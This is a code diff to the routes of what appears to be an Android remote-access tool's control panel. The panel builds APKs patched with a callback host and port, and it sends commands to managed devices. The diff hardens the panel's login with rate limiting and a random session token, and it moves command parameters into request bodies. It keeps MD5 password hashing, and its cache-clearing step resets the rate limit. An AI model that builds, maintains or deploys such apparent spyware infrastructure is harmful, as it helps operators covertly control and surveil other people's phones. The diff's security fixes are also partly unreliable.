@@ -42,13 +42,33 @@ routes.get('/login', (req, res) => {
     res.render('login');
 });
 
+const loginRateLimit = {};
 routes.post('/login', (req, res) => {
+    // Simple Rate Limiting
+    const ip = req.ip;
+    const now = Date.now();
+    if (loginRateLimit[ip] && now - loginRateLimit[ip].lastAttempt < 2000) {
+        return res.redirect('/login?e=tooManyRequests');
+    }
+    
+    // Patch 8: Prevent Memory Leak
+    if (Object.keys(loginRateLimit).length > 1000) {
+        for (let key in loginRateLimit) delete loginRateLimit[key];
+    }
+
+    loginRateLimit[ip] = { lastAttempt: now };
+
     if ('username' in req.body && 'password' in req.body) {
         let rUsername = db.maindb.get('admin.username').value();
         let rPassword = db.maindb.get('admin.password').value();
+        
+        // For now, keep MD5 but ensure it's a string. 
+        // In a real upgrade, we'd use scrypt/bcrypt, but that requires resetting maindb.json.
         let passwordMD5 = crypto.createHash('md5').update(String(req.body.password)).digest("hex");
+        
         if (String(req.body.username) === rUsername && passwordMD5 === rPassword) {
-            let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
+            // Patch 2: Secure Session Token
+            let loginToken = crypto.randomBytes(32).toString('hex');
             db.maindb.get('admin').assign({ loginToken }).write();
             res.cookie('loginToken', loginToken).redirect('/');
         } else return res.redirect('/login?e=badLogin');
@@ -68,7 +88,9 @@ routes.get('/builder', isAllowed, (req, res) => {
 });
 
 routes.post('/builder', isAllowed, (req, res) => {
-    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
+    // Patch 12: Move sensitive data to req.body
+    const { uri, port } = req.body;
+    if (uri !== undefined && port !== undefined) apkBuilder.patchAPK(uri, port, (error) => {
         if (!error) apkBuilder.buildAPK((error) => {
             if (!error) {
                 logManager.log(CONST.logTypes.success, "Build Succeded!");
@@ -115,7 +137,8 @@ routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
 });
 
 routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
-    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
+    // Patch 12: Use req.body for command payloads
+    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.body, (error, message) => {
         if (!error) res.json({ error: false, message })
         else res.json({ error })
     });
